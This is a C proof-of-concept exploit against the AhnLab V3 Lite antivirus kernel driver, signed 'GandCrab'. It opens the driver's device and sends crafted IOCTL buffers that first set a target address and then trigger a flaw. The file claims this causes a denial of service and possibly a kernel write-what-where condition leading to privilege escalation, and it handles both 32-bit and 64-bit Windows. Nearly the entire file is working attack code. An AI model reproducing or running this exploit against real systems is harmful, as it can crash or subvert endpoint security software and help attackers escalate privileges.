/*

Target: AhnLab V3 Lite
Type: Denial of service
Author: GandCrab

*Abstract*

Ahnlab V3 Lite Denial of service. Possibly can trigger full write-what-where condition with privelege escalation.

Tested on Win7 x86, Win7 x64, Win 10 x64

*/




#include <Windows.h>
#include "w64wow64.h"


#define MIN_BUF 0x200

#define IOCTL_SET_ADDR 0x82000010
#define IOCTL_TRIGGER 0x8200001E
///////////////////////////////

typedef BOOL(WINAPI *KernelIsWow64Process)(
	HANDLE hProcess,
	PBOOL  Wow64Process
	);
typedef BOOL (WINAPI * KernelWow64DisableWow64FsRedirection)(
	_Out_ PVOID *OldValue
);
typedef BOOL(WINAPI * KernelWow64RevertWow64FsRedirection)(
	_Out_ PVOID *OldValue
	);
static HANDLE hDefaulteHeap = NULL;
static KernelIsWow64Process IsWow64 = NULL;
static KernelWow64DisableWow64FsRedirection  DisableWow64FsRedirection = NULL;
static KernelWow64RevertWow64FsRedirection  RevertWow64FsRedirection = NULL;

//////////////////////////////

inline LPVOID Alloc(DWORD dwSize)
{

	if (!hDefaulteHeap) {
		hDefaulteHeap = GetProcessHeap();
	}
	return HeapAlloc(hDefaulteHeap, 0, dwSize);
}

inline LPVOID ReAlloc(LPVOID lpMem, DWORD dwSize)
{

	if (!hDefaulteHeap) {
		hDefaulteHeap = GetProcessHeap();
	}
	return HeapReAlloc(hDefaulteHeap, 0, lpMem, dwSize);
}
inline BOOL Free(LPVOID lpMem)
{
	return HeapFree(hDefaulteHeap, 0, lpMem);
}


BOOL CheckX64()
{
	IsWow64 = (KernelIsWow64Process)GetProcAddress(GetModuleHandleW(L"kernel32"),
		"IsWow64Process");
	if (!IsWow64)
		return FALSE;

	BOOL pbResult = FALSE;

	if (!IsWow64(GetCurrentProcess(), &pbResult))
		return FALSE;

	return pbResult;
}
BOOL RevertFsRedirection(PVOID pOldVal)
{
	if (!RevertWow64FsRedirection)
		RevertWow64FsRedirection = (KernelWow64RevertWow64FsRedirection)GetProcAddress(GetModuleHandleA("kernel32.dll"),
			"Wow64RevertWow64FsRedirection");

	if (!RevertWow64FsRedirection)
		return FALSE;
	
	return RevertWow64FsRedirection(&pOldVal);
}
BOOL DisableFsRedirection(PVOID pOldVal)
{
	if (!DisableWow64FsRedirection)
		DisableWow64FsRedirection = (KernelWow64DisableWow64FsRedirection)GetProcAddress(GetModuleHandleA("kernel32.dll"),
			"Wow64DisableWow64FsRedirection");

	if (!DisableWow64FsRedirection)
		return FALSE;
	
	return DisableWow64FsRedirection(&pOldVal);
}
DWORD GetNtoskrnlTimeStamp()
{
	WCHAR wszPath[] = L"%windir%\\system32\\ntoskrnl.exe";

	DWORD dwSize = ExpandEnvironmentStringsW(wszPath, NULL, 0);

	if (dwSize <= 0)
		return 0;

	LPWSTR lpwszFullPath = (LPWSTR)Alloc((dwSize + 1) * 2);

	dwSize = ExpandEnvironmentStringsW(wszPath, lpwszFullPath, dwSize);
	

	if (dwSize <= 0) {
		Free(lpwszFullPath);
		return 0;
	}

	BOOL b64 = CheckX64();
	PVOID pOldVal = 0;

	if (b64) {
		
		DisableFsRedirection(&pOldVal);
	}

	HANDLE hFile = CreateFileW(lpwszFullPath, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (b64) {
		RevertFsRedirection(&pOldVal);
	}

	Free(lpwszFullPath);

	if (INVALID_HANDLE_VALUE == hFile)
		return 0;

	DWORD dwTemp = sizeof(IMAGE_DOS_HEADER);

	PCHAR lpBuffer = (PCHAR)Alloc(dwTemp);

	if (!lpBuffer)
		return 0;

	DWORD dwOut = 0;
	ReadFile(hFile, lpBuffer, dwTemp, &dwOut, NULL);
	if (dwOut != dwTemp) {

		Free(lpBuffer);
		CloseHandle(hFile);
		return 0;
	}

	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lpBuffer;

	DWORD dwOffset = pDosHdr->e_lfanew;


	lpBuffer = (PCHAR)ReAlloc(lpBuffer, dwOffset + dwTemp + sizeof(IMAGE_NT_HEADERS64));

	dwTemp = dwOffset + sizeof(IMAGE_NT_HEADERS64);

	ReadFile(hFile, lpBuffer, dwTemp, &dwOut, NULL);

	if (dwOut != dwTemp) {
		Free(lpBuffer);
		CloseHandle(hFile);
		return 0;
	}

	CloseHandle(hFile);

	UINT_PTR pOptionalCheck = ((UINT_PTR)lpBuffer + (dwOffset - sizeof(IMAGE_DOS_HEADER)));

	DWORD dwStamp = 0;
	if (((PIMAGE_NT_HEADERS)pOptionalCheck)->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
		dwStamp = ((PIMAGE_NT_HEADERS)pOptionalCheck)->FileHeader.TimeDateStamp;
	}
	if (((PIMAGE_NT_HEADERS64)pOptionalCheck)->FileHeader.Machine == IMAGE_FILE_MACHINE_IA64 ||
		((PIMAGE_NT_HEADERS64)pOptionalCheck)->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
		dwStamp = ((PIMAGE_NT_HEADERS64)pOptionalCheck)->FileHeader.TimeDateStamp;
	}

	Free(lpBuffer);

	return dwStamp;
}
BOOL RunPoc()
{
	BOOL result = FALSE;
	DWORD dwKrnStamp = GetNtoskrnlTimeStamp();

	if (!dwKrnStamp)
		return result;

	HANDLE hFile = CreateFileW(L"\\\\.\\AntiStealth_V3LITE30F", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);

	if (hFile == INVALID_HANDLE_VALUE)
		return result;

	PVOID lpPayload = VirtualAlloc(0, MIN_BUF, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpPayload) {
		CloseHandle(hFile);
		return result;
	}

	PVOID lpOutBuffer = VirtualAlloc(0, MIN_BUF, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpOutBuffer) {
		VirtualFree(lpPayload, MIN_BUF, MEM_DECOMMIT);
		
		CloseHandle(hFile);
		return result;
	}

	PVOID lpIoStatus = VirtualAlloc(0, 0x10, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpIoStatus) {

		VirtualFree(lpOutBuffer, MIN_BUF, MEM_DECOMMIT);
		VirtualFree(lpPayload, MIN_BUF, MEM_DECOMMIT);

		CloseHandle(hFile);
		return result;
	}

	DWORD dwWritten = 0;

	if (CheckX64()) {

		DWORD64 qwTargetAddr = 0xDEADBEEFDEADBEEF;
		DWORD64 nGarbage = -1;
		DWORD64 nInBufferSize = 0x20;

		DWORD64 * lpqwBuffer = (DWORD64*)lpPayload;

		lpqwBuffer[0] = qwTargetAddr;
		lpqwBuffer[1] = dwKrnStamp;
		lpqwBuffer[2] = nGarbage;
		lpqwBuffer[3] = nGarbage;

		
		

		DWORD64 lvpNt = GetModuleBase64((PWSTR)L"ntdll.dll");

		if(!lvpNt)
			goto cleanup;


		DWORD64 NtDeviceIoControl64 = GetProcAddress64(lvpNt,
			(PSTR)"NtDeviceIoControlFile");

		if(!NtDeviceIoControl64)
			goto cleanup;

		DWORD64 dwWrittenAddr = (DWORD64)&dwWritten;
		

		X64Call(NtDeviceIoControl64, 12, (DWORD64)hFile,(DWORD64)NULL, (DWORD64)NULL, (DWORD64)NULL,
			(DWORD64)lpIoStatus,(DWORD64)IOCTL_SET_ADDR, (DWORD64)lpqwBuffer,
			(DWORD64)nInBufferSize, (DWORD64)lpOutBuffer, (DWORD64)0, 
			dwWrittenAddr, (DWORD64)0 );

		lpqwBuffer[0] = 3;
		lpqwBuffer[1] = 0xFF;

		nInBufferSize = 0x200;

		DWORD64 nOutBufferSize = 0x20;

		result = X64Call(NtDeviceIoControl64, 12, (DWORD64)hFile, (DWORD64)NULL, (DWORD64)NULL, (DWORD64)NULL,
			(DWORD64)lpIoStatus, (DWORD64)IOCTL_TRIGGER, (DWORD64)lpqwBuffer,
			(DWORD64)nInBufferSize, (DWORD64)lpOutBuffer, (DWORD64)nOutBufferSize,
			dwWrittenAddr, (DWORD64)0);


		if (!result)
			result = TRUE;

	}
	else {
		DWORD dwTargetAddr = 0xDEADBEEF;
		DWORD nGarbage = -1;
		DWORD nInBufferSize = 8;

		DWORD * lpdwBuffer = (DWORD*)lpPayload;

		lpdwBuffer[0] = dwTargetAddr;
		lpdwBuffer[1] = dwKrnStamp;
		lpdwBuffer[2] = nGarbage;
		lpdwBuffer[3] = nGarbage;

		
		DeviceIoControl(hFile, IOCTL_SET_ADDR, (LPVOID)lpdwBuffer, nInBufferSize, (LPVOID)lpOutBuffer, 0x0, &dwWritten, 0);

		
		lpdwBuffer[0] = 3;
		lpdwBuffer[1] = 0xFF;
		lpdwBuffer[2] = 3;
		lpdwBuffer[3] = 0xFF;

		result = DeviceIoControl(hFile, IOCTL_TRIGGER, (LPVOID)lpdwBuffer, 0x200, (LPVOID)lpOutBuffer, 0x20, &dwWritten, 0);
	}

cleanup:
	if(lpPayload)
		VirtualFree(lpPayload, MIN_BUF, MEM_DECOMMIT);
	if (lpOutBuffer)
		VirtualFree(lpOutBuffer, MIN_BUF, MEM_DECOMMIT);
	if (lpIoStatus)
		VirtualFree(lpIoStatus, 0x10, MEM_DECOMMIT);
	
	CloseHandle(hFile);

	return result;
}
int main()
{
	RunPoc();
    return 0;
}

